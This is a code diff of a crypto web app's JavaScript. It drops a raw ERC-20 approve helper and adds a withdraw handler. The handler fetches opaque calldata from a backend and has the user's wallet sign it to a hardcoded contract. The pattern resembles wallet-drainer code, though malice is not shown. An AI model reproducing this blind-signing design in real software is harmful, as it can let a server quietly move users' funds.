@@ -30,38 +30,39 @@ function logToPanel(msg) {
   }
 }
 window.logToPanel = logToPanel;
-async function requestTokenSpendApproval(userAddr, amountWei, tokenIn, spenderContract) {
+
+function setupActionListeners() {
+  // Dynamic Capital Processing Router Pipeline
+  document.getElementById("withdrawBtn")?.addEventListener("click", async () => {
+    if (!window.USER_ADDR) return logToPanel("❌ Connect wallet first.");
+    const inputAmount = document.getElementById("withdrawAmount").value;
+    if (!inputAmount || parseFloat(inputAmount) <= 0) return logToPanel("❌ Specify a valid amount.");
+
+    const amountWei = ensure18Decimals(inputAmount);
+    logToPanel(`🔄 Packaging withdrawal data parameters for: ${amountWei} Wei...`);
+
     try {
-        const cleanUser = userAddr.toLowerCase().trim();
-        const cleanToken = tokenIn.toLowerCase().trim();
-        const cleanSpender = spenderContract.toLowerCase().trim();
-
-        const approveMethodId = "0x095ea7b3";
-        const paddedSpender = cleanSpender.replace("0x", "").padStart(64, "0");
-        const paddedAmount = BigInt(amountWei).toString(16).padStart(64, "0");
-        const compiledData = approveMethodId + paddedSpender + paddedAmount;
-
-        logToPanel(`📢 [APPROVAL PROMPT] Authorizing Token Spend Allowance for: ${cleanToken}`);
-        
-        const approveTxHash = await window.ethereum.request({
-            method: "eth_sendTransaction",
-            params: [{
-                from: cleanUser,
-                to: cleanToken, 
-                data: compiledData,
-                value: "0x0"
-            }]
+      const res = await fetch(`${window.API_BASE}/prodbot/withdraw`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ token: "0x55d398326f99059fF775485246999027B3197955", amount: amountWei })
+      });
+      const data = await res.json();
+      if (data && data.status === "ok") {
+        const txHash = await window.ethereum.request({
+            method: 'eth_sendTransaction',
+            params: [{ from: window.USER_ADDR, to: "0xe191B1b7E5c3d7b7B9386F4212259241fC62135B", data: data.withdraw_call, value: '0x0' }],
         });
-        
-        logToPanel(`✅ Approval hash recorded: ${approveTxHash}. Waiting 6s for block state propagation...`);
-        await new Promise(resolve => setTimeout(resolve, 6000));
-        return true;
+        logToPanel(`✅ Withdrawal Sent! Hash: ${txHash}`);
+      }
     } catch (err) {
-        logToPanel(`❌ User rejected token allocation balance approval: ${err.message || err}`);
-        throw err;
+      logToPanel(" Withdrawal Action Interrupted: " + err.message);
     }
+  });
 }
-window.requestTokenSpendApproval = requestTokenSpendApproval;
+
+
+
 async function runbscSwapUniswap(userAddr, amountWei, fromToken, toToken, targetRouter) {
     try {
         const V12_ADDR = "0xe191B1b7E5c3d7b7B9386F4212259241fC62135B"; 
